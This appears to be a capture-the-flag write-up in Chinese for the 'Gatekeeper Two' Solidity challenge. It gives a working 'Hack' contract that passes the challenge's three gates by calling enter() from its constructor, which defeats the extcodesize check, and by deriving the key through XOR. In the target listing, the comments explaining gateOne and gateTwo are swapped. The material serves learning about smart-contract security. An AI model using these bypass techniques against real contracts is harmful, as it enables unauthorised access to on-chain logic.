# Gatekeeper Two
## 題目
<img width="634" alt="截圖 2024-09-13 下午1 46 42" src="https://github.com/user-attachments/assets/06f68614-cef0-4b60-acd3-5615b0079380">

這個題目來自 Gatekeeper Two，要求是通過三個 Gate（`gateOne`、`gateTwo` 和 `gateThree`）來進入合約。目標是成功調用 `enter` 函數，並將 `entrant` 設置為我們的地址（`tx.origin`）。

## 合約
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
    // 使用了內聯匯編檢查當前合約的 extcodesize 是否為 0。這個檢查的目的是防止合約在部署之後調用它。當合約的構造函數運行時，合約的代碼尚未完全寫入鏈上，因此 extcodesize 在構造函數中會是 0。我們可以利用這一點，通過在合約的構造函數中調用 enter 函數來繞過這個檢查。

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }
    // msg.sender 必須與 tx.origin 不同，這意味著我們需要通過合約來調用 enter 函數，而不能直接用外部帳戶來調用。因此，我們必須寫一個合約來觸發 enter 函數。

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }
    // 這裡要求我們提供的 _gateKey 必須與 (uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey)) == type(uint64).max 這個條件相符。
    // 這是一個 XOR 運算，uint64 的最大值是 2^64 - 1，也就是 type(uint64).max。
    // 透過位運算的特性，如果 a ^ b = max，則 b = a ^ max。因此，`_gateKey 可以通過 msg.sender 的哈希值與 type(uint64).max 進行 XOR 計算得到。

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

## Hack
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperTwo {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack {
    constructor(IGateKeeperTwo target) {
        // Bitwise xor
        // a     = 1010
        // b     = 0110
        // a ^ b = 1100

        // a ^ a ^ b = b

        // a     = 1010
        // a     = 1010
        // a ^ a = 0000

        // max = 11...11
        // s ^ key = max
        // s ^ s ^ key = s ^ max 
        //         key = s ^ max 
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = type(uint64).max ^ s;
        bytes8 key = bytes8(k);
        require(target.enter(key), "failed");
    }
}

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    } 
    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
### Step：
1. **gateOne**：由於 `Hack` 合約調用 `enter`，所以 `msg.sender` 是 `Hack` 合約的地址，而 `tx.origin` 是攻擊者的外部帳戶，滿足 `msg.sender != tx.origin` 的條件。
2. **gateTwo**：因為合約在構造函數中調用 `enter`，此時 `extcodesize(caller()) == 0`，滿足 `gateTwo` 的條件。
3. **gateThree**：我們計算 `_gateKey` 的方法是先獲取 `msg.sender` 的哈希值，然後使用 XOR 運算得到正確的 key。通過 `uint64(msg.sender 的哈希值) ^ uint64(_gateKey) == type(uint64).max` 這個公式，我們可以求得正確的 `_gateKey`。

